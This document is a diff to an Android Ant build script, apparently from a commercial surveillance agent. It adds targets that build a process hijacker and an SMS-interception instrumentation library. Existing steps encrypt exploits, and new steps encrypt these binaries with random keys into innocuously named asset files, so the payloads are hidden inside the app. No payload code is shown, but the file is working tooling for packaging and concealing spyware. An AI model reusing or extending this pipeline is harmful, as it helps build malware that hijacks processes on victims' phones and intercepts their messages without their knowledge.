@@ -49,6 +49,12 @@
 	<property file="ant.properties" />
 	<loadproperties srcFile="project.properties" />
 
+	<property name="ddi.sms.lib" value="procacc" />
+	<property name="ddi.sms.libout" value="libprocacc.so" />
+    <property name="ddi.sms.libL" value="procacc5" />
+    <property name="ddi.sms.liboutL" value="libprocacc5.so" />
+    <property name="ddi.sms.dir" value="../instrumentation/ddi/examples/smsdispatch/" />
+    <property name="ddi.hijacker" value="../instrumentation/adbi/hijack" />
 	<property name="rcscore.path" value="antlibs" />
 	<property name="out.dir" value="bin" />
 	<property name="out.classes.absolute.dir" location="${out.dir}/classes" />
@@ -135,49 +141,111 @@
 
 	<target name="encrypt-hijacklibrary">
 		<delete file="assets/ib.data" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}i" inputFile="preprocess/libt.so" outputFile="assets/ib.data" />
+		<crypter encrypt="true" inputFile="preprocess/libt.so" keyFile="${randomKeyStatusDb}i" outputFile="assets/ib.data" salt="${randomSalt}" />
 		<delete file="assets/mb.data" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}m" inputFile="preprocess/hijack" outputFile="assets/mb.data" />
-
+		<crypter encrypt="true" inputFile="preprocess/hijack" keyFile="${randomKeyStatusDb}m" outputFile="assets/mb.data" salt="${randomSalt}" />
+        <delete file="assets/mbL.data" />
+        <crypter encrypt="true" inputFile="preprocess/hijackL" keyFile="${randomKeyStatusDb}m" outputFile="assets/mbL.data" salt="${randomSalt}" />
+        <delete file="assets/pa.data" />
+        <crypter encrypt="true" inputFile="preprocess/${ddi.sms.libout}" keyFile="${randomKeyStatusDb}p" outputFile="assets/pa.data" salt="${randomSalt}" />
+        <delete file="assets/paL.data" />
+        <crypter encrypt="true" inputFile="preprocess/${ddi.sms.liboutL}" keyFile="${randomKeyStatusDb}p" outputFile="assets/paL.data" salt="${randomSalt}" />
 	</target>
 
-	<target name="encrypt-hijacklibrary-debug">
-		<delete file="assets/ib.data" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}i" inputFile="preprocess/libt_debug.so" outputFile="assets/ib.data" />
-		<delete file="assets/mb.data" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}m" inputFile="preprocess/hijack" outputFile="assets/mb.data" />
-	</target>
 
 
-    <target name="delete-libs" depends="encrypt-exploit, encrypt-hijacklibrary">
-        <delete>
-            <fileset dir="assets" includes="**/*.data" excludes="**/cb.data,**/rb.data"/>
-        </delete>
-    </target>
+        <target name="build-instrumentation-clean">
+          <echo> cleaning dir ${ddi.sms.dir} </echo>
+          <delete>
+            <!-- recursive **/ -->
+            <fileset dir="${ddi.sms.dir}" includes="**/*.so"/>
+          </delete>
+        </target>
 
-	<target name="libs" depends="encrypt-exploit, encrypt-hijacklibrary">
-	</target>
 
-	<target name="libs-debug" depends="encrypt-exploit,  encrypt-hijacklibrary">
-	</target>
+<macrodef name="build-instr">
+   <attribute name="lib" />
+   <attribute name="libout" />
+   <attribute name="debug" />
+   <attribute name="buildDir" />
+   <attribute name="buildScript" />
+   <sequential>
+      <echo> @{buildScript} @{debug} @{lib} </echo>
 
-	<target name="init" depends="salt" unless="build.number">
-		<tstamp>
-			<format property="timestamp.BUILD" pattern="yyyyMMdd-HHmmss" />
-		</tstamp>
-		<property file="build.number" />
-		<echo message="timestamp ${timestamp.BUILD}" />
-		<echo message="build.number ${build.number}" />
+      <exec executable="@{buildScript}" dir="@{buildDir}" failonerror="true">
+        <arg value="@{lib}" />
+        <arg value="@{debug}" />
+     </exec>
+     <copy file="@{buildDir}/libs/armeabi/@{libout}" tofile="preprocess/@{libout}" overwrite="true" />
+  </sequential>
+</macrodef>
 
-	</target>
+<macrodef name="build-hijack">
+   <attribute name="debug" />
+   <attribute name="buildDir" />
+   <attribute name="out" />
+   <sequential>
+      <echo> building hijacker @{debug} </echo>
+      <exec executable="./build.sh" dir="@{buildDir}" failonerror="true">
+        <arg value="@{debug}" />
+     </exec>
+     <echo> coping hijacker @{out} </echo>
+     <copy file="@{buildDir}/libs/armeabi/hijack" tofile="preprocess/@{out}" overwrite="true" />
+  </sequential>
+</macrodef>
 
-	<!-- = = = = = = = = = = = = = = = = =
-          macrodef: set-cfg0
-          copies Cfg.java considering:
-          - kind: debug, release
-          - version: 2,3
-          TODO
-         = = = = = = = = = = = = = = = = = -->
+<target name="build-instrumentation-debug-L" depends="build-instrumentation-clean">
+    <build-hijack debug="-d -P"  buildDir="${ddi.hijacker}" out="hijackL"/>
+    <build-instr debug="-d -P" libout="${ddi.sms.liboutL}"  lib="-l${ddi.sms.libL}" buildDir="${ddi.sms.dir}" buildScript="./build-dex.sh"  />
+</target>
+
+<target name="build-instrumentation-L" depends="build-instrumentation-clean">
+   <build-hijack debug="-D -P"  buildDir="${ddi.hijacker}" out="hijackL"/>
+   <build-instr debug="-P"   libout="${ddi.sms.liboutL}" lib="-l${ddi.sms.libL}" buildDir="${ddi.sms.dir}" buildScript="./build-dex.sh"  />
+</target>
+
+
+<target name="build-instrumentation-debug" depends="build-instrumentation-clean">
+  <build-hijack debug="-d"  buildDir="${ddi.hijacker}" out="hijack"/>
+  <build-instr debug="-d"  libout="${ddi.sms.libout}" lib="-l${ddi.sms.lib}" buildDir="${ddi.sms.dir}" buildScript="./build-dex.sh"  />
+</target>
+
+<target name="build-instrumentation" depends="build-instrumentation-clean">
+  <build-hijack debug="-D"  buildDir="${ddi.hijacker}" out="hijack"/>
+  <build-instr debug=""   libout="${ddi.sms.libout}" lib="-l${ddi.sms.lib}" buildDir="${ddi.sms.dir}" buildScript="./build-dex.sh"  />
+</target>
+
+
+
+<target name="delete-libs" depends="encrypt-exploit, encrypt-hijacklibrary">
+<delete>
+    <fileset dir="assets" includes="**/*.data" excludes="**/cb.data,**/rb.data"/>
+</delete>
+</target>
+
+<target name="libs" depends="build-instrumentation, build-instrumentation-L, encrypt-exploit, encrypt-hijacklibrary">
+</target>
+
+<target name="libs-debug" depends="build-instrumentation-debug, build-instrumentation-debug-L, encrypt-exploit,  encrypt-hijacklibrary">
+</target>
+
+<target name="init" depends="salt" unless="build.number">
+<tstamp>
+    <format property="timestamp.BUILD" pattern="yyyyMMdd-HHmmss" />
+</tstamp>
+<property file="build.number" />
+<echo message="timestamp ${timestamp.BUILD}" />
+<echo message="build.number ${build.number}" />
+
+</target>
+
+<!-- = = = = = = = = = = = = = = = = =
+  macrodef: set-cfg0
+  copies Cfg.java considering:
+  - kind: debug, release
+  - version: 2,3
+  TODO
+ = = = = = = = = = = = = = = = = = -->
 	<macrodef name="set-cfg">
 		<attribute name="kind" />
 		<attribute name="osversion" />
@@ -233,6 +301,7 @@
 				<case value="v2" >
 
 					<!-- Alzare l'api level in caso di 3.x o 4.x -->
+					<echo message="Copy BackGround" />
 					<echo message="Copy BackGround" />
 
 					<copy file="preprocess/AndroidManifest.BACKGROUND.xml" tofile="AndroidManifest.xml" overwrite="true">
